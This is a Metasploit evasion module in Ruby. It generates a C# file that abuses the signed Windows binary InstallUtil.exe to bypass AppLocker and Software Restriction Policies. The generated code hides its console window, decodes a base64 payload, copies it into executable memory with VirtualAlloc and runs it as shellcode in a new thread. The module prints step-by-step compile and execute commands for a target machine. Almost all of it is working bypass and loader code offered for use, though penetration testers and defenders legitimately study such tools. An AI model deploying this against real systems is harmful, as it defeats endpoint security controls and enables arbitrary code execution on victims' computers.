##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'applocker_evasion_install_util',
      'Description' => %q{
        This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies.
        This technique utilises the Microsoft signed binary InstallUtil.exe to execute user supplied code.
      },
      'Author'      =>
        [
          'Nick Tyrer <@NickTyrer>', # For Module
          'Casey Smith',  # install_util bypass research
        ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => [ ARCH_X86, ARCH_X64 ],
      'Targets'     => [ ['Microsoft Windows', {}] ]
    ))

    register_options([
      OptString.new('FILENAME', [true, 'Filename for the evasive file (default: install_util.txt)', 'install_util.txt'])
    ])
  end


  def build_payload
    esc = Rex::Text.encode_base64(payload.encoded)
  end


  def instructions
    <<~HEREDOC
        ___________________________________________________________________________________________________________________________________________
       |                                                                                                                                           |
       |                                                                Instructions                                                               |
       |___________________________________________________________________________________________________________________________________________|
       |                                                                                                                                           |
       | 1.Copy the entire contents of #{datastore['FILENAME']} to the target and execute:                                                                 |
       | 2.x86{                                                                                                                                    |
       |       Compile using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe /out:installutil.exe #{datastore['FILENAME']}                          |
       |       Execute using: C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe       |
       |      }                                                                                                                                    |
       |  x64{                                                                                                                                     |
       |      Compile using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\csc.exe /out:installutil.exe #{datastore['FILENAME']}                         |
       |      Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe      |
       |      }                                                                                                                                    |
       |___________________________________________________________________________________________________________________________________________|
    HEREDOC
  end


  def install_util
    esc = build_payload
    test = Rex::Text.rand_text_alphanumeric (8)
    <<~HEREDOC
       /*
       #{instructions}
      */
       using System;
       namespace #{Rex::Text.rand_text_alpha 8}
       {
       public class #{Rex::Text.rand_text_alphanumeric 8} { public static void Main() { } }
       [System.ComponentModel.RunInstaller(true)]
       public class #{Rex::Text.rand_text_alphanumeric 8} : System.Configuration.Install.Installer
       {
       private static Int32 MEM_COMMIT=0x1000;
       private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
       private static UInt32 INFINITE = 0xFFFFFFFF;
       [System.Runtime.InteropServices.DllImport("kernel32")]
       private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
       [System.Runtime.InteropServices.DllImport("kernel32")]
       private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);
       [System.Runtime.InteropServices.DllImport("kernel32")]
       private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
       [System.Runtime.InteropServices.DllImport("user32.dll")]
       static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
       [System.Runtime.InteropServices.DllImport("Kernel32")]
       private static extern IntPtr GetConsoleWindow();
       const int SW_HIDE = 0;
       const int SW_SHOW = 5;
       public override void Uninstall(System.Collections.IDictionary s)
       {
       IntPtr hwnd;
       hwnd = GetConsoleWindow();
       ShowWindow(hwnd, SW_HIDE);
       string #{test} = "#{esc}";
       byte[] newBytes = Convert.FromBase64String(#{test});
       byte[] sc = newBytes;
       IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
       System.Runtime.InteropServices.Marshal.Copy(sc, 0, m, sc.Length);
       IntPtr id = IntPtr.Zero;
       WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
       }
       }
       }
    HEREDOC
  end


  def run
    file_create(install_util)
    print_status("#{instructions}")
  end

end

